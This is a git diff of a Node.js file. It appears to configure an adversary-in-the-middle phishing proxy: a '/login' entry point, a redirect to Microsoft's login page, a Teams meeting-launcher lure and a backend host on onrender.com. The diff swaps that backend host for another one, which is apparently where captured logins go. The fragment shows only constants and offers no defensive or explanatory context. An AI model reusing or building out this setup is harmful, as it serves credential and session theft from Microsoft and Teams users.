@@ -11,7 +11,7 @@ const crypto = require('crypto');
 
 const PROXY_ENTRY_POINT = "/login";
 const REDIRECT_URL = "https://login.microsoftonline.com/";
-const BACKEND_URL = "https://meeting-h5ze.onrender.com";
+const BACKEND_URL = "https://meeting-1-rzx6.onrender.com";
 const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
 
 const PROXY_PATHNAMES = {
